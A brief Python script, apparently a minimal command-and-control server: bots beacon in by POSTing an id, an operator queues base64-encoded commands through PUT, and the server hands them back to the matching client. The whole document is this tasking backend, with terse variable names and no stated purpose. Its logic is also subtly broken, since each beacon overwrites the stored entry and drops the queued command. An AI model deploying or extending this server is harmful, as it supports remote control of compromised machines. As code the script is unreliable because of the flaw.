from http.server import HTTPServer,BaseHTTPRequestHandler
import json,base64,urllib.parse as u
p=8000
c={}
class H(BaseHTTPRequestHandler):
 def do_GET(s):
  if s.path=='/r':s.send_response(200);s.send_header('Content-type','text/plain');s.end_headers();s.wfile.write(b'ok')
 def do_POST(s):
  l=int(s.headers['Content-Length'])
  d=json.loads(s.rfile.read(l).decode())
  i=d['id'];c[i]=d
  s.send_response(200);s.send_header('Content-type','application/json');s.end_headers()
  r={'cmd':''}
  if i in c and 'cmd' in c[i]:r['cmd']=c[i]['cmd'];del c[i]['cmd']
  s.wfile.write(json.dumps(r).encode())
 def do_PUT(s):
  i=u.parse_qs(u.urlparse(s.path).query)['id'][0]
  l=int(s.headers['Content-Length'])
  c[i]['cmd']=base64.b64decode(s.rfile.read(l)).decode()
  s.send_response(200);s.end_headers()
s=HTTPServer(('',p),H)
print(f'srv up @ {p}')
s.serve_forever()
